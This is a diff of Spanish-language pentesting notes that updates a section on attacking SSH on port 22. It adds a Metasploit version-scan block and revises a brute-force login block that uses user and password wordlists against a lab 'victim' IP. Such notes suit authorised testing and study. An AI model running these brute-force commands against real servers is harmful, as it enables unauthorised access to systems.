@@ -289,15 +289,26 @@ Tags: #Metasploit #BlueKeep #EternalBlue #SMB #SSH #HTTP #MySQL #MSSQL #Auxiliar
 ## Puerto 22 SSH
 
 ```bash 
+# Miramos la version del SSH
+❯ msfconsole -q                  # q = Quitar el banner de inicio
+
+	❯ use auxiliary/scanner/ssh/ssh_version        # Usamos el auxiliar 
+	❯ options
+	❯ set RHOSTS 192.168.1.194                     # Colocamos la IP de la maquina victima
+	❯ run 
+```
+
+```bash 
 # Enumerar usuarios y passwds con un diccionario de Fuerza Bruta
 ❯ msfconsole -q                                    # q = Quitar el banner de inicio
 
 	❯ use auxiliary/scanner/ssh/ssh_login         # Usamos el auxiliar
 	❯ options
-	❯ set userpass_file /usr/share/wordlists/metasploit/root_userpass.txt
+	❯ set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
+	❯ set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt
 	❯ set STOP_ON_SUCCESS true
 	❯ set RHOSTS 192.168.1.194                    # Colocamos la IP de la maquina victima
-	❯ set verbose true
+	❯ set VERBOSE true
 	❯ run 
 ```
 
